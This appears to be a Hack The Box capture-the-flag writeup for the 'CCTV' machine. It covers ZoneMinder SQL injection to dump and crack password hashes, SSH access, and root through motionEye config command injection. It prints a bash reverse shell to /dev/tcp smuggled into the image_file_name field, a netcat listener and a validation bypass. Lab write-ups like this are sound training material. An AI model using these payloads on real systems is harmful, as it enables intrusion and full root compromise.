# CCTV — Hack The Box Writeup
![](https://github.com/user-attachments/assets/69bf19a2-0aac-4c18-a7b2-64704c262410)

## Reconnaissance

### Port Scanning
```bash
nmap -sC -sV -oN nmap.txt 10.129.39.160
```
Open ports: 22 (SSH), 80 (HTTP)

### Web Enumeration
The web server redirects to `http://cctv.htb`. Adding to `/etc/hosts`:
```bash
echo "10.129.39.160 cctv.htb" | sudo tee -a /etc/hosts
```

Directory and subdomain fuzzing with ffuf revealed a ZoneMinder installation at `http://cctv.htb/zm/`.

---

## Initial Access

### CVE-2026-27470 — ZoneMinder Second-Order SQL Injection


ZoneMinder v1.37.63 is vulnerable to a second-order SQL injection via the event `Name` field. The payload is stored safely via a parameterized query but is later unsafely used in a `getNearEvents()` call, allowing UNION-based data exfiltration.

**Prerequisites:** An authenticated session and at least two events in the database.

**Steps:**

1. Log in with default credentials `admin:admin`
2. Create two events via the API to enable `NextEventId` exfiltration:
```bash
curl -s -b cookies.txt -X POST "http://cctv.htb/zm/api/events.json" \
  -d "Event[MonitorId]=1&Event[Name]=test1&Event[Cause]=test&Event[StartDateTime]=2024-01-01+00:00:00&Event[EndDateTime]=2024-01-01+00:00:10&Event[Frames]=1&Event[AlarmFrames]=0&Event[TotScore]=0&Event[AvgScore]=0&Event[MaxScore]=0&Event[StateId]=1&Event[Scheme]=Deep&Event[StorageId]=0"
```

3. Run the PoC:
```bash
python3 poc.py -t http://cctv.htb/zm -u admin -p admin --event-id 1 --dump-users
```

![sqli](https://github.com/user-attachments/assets/cda75bb0-656d-4aba-aabd-29761a20f6ad)


**Dumped credentials:**
```
admin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
superadmin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

### Cracking Hashes


```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

Results:
```
mark:opensesame
superadmin:admin
```

![crack passwords](https://github.com/user-attachments/assets/3aae5538-032c-457c-8195-7aa881d07fde)


### SSH Access
```bash
ssh mark@10.129.39.160
# password: opensesame
```

---

## User Flag

The user flag was not in mark's home directory. Further enumeration was required.

---

## Privilege Escalation

### Enumeration with LinPEAS

Running linpeas revealed:
- `motioneye.service` running as **root**
- motionEye listening on `127.0.0.1:8765`
- A file `/opt/video/backups/server.log` showing `sa_mark` authenticating repeatedly
- Docker bridge interfaces with active traffic
- User `sa_mark` exists on the system

### SSH Port Forwarding
```bash
ssh -N -L 8765:127.0.0.1:8765 mark@10.129.39.160
```

### Finding motionEye Credentials

The motionEye config at `/etc/motioneye/motion.conf` contained:
```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @normal_username user
# @normal_password 
```

The admin password `989c5a8ee87a0e9521ec81a79187d162109282f0` is stored as plaintext.

### CVE-2025-60787 — motionEye RCE via Unsanitized Config Parameter

motionEye v0.43.1b4 is vulnerable to command injection via the `image_file_name` field. User-supplied values are written directly to `camera-*.conf` without sanitization. When the motion process restarts, it parses the config and executes shell-expandable strings as commands.

**Steps:**

1. Start a netcat listener:
```bash
nc -lvnp 9001
```

2. Log into motionEye at `http://127.0.0.1:8765` as `admin:989c5a8ee87a0e9521ec81a79187d162109282f0`

3. Open browser developer console (F12) and bypass client-side validation:
```javascript
configUiValid = function() { return true; }
```

4. Navigate to Camera Settings → Still Images:
   - Set Capture Mode to `Interval Snapshots`
   - Set Interval to `10`
   - Set Image File Name to:
```
$(bash -c 'bash -i >& /dev/tcp/10.10.14.139/9001 0>&1').%Y-%m-%d-%H-%M-%S
```

5. Click Apply — motionEye writes the payload to `camera-1.conf` and restarts motion

### Root Shell


![Root proof](https://github.com/user-attachments/assets/a54e4707-16e4-4ae4-9beb-421e19c3c04d)

Root shell received on listener. motionEye runs as root so the injected command executes with full privileges.

```bash
cat /root/root.txt
```

---

## Summary

| Step | Detail |
|------|--------|
| Foothold | CVE-2026-27470 — ZoneMinder second-order SQLi |
| Credentials | Bcrypt hashes cracked with john/rockyou |
| SSH | `mark:opensesame` |
| Privesc | CVE-2025-60787 — motionEye RCE via config injection |
| Root | Shell via motionEye running as root |

---
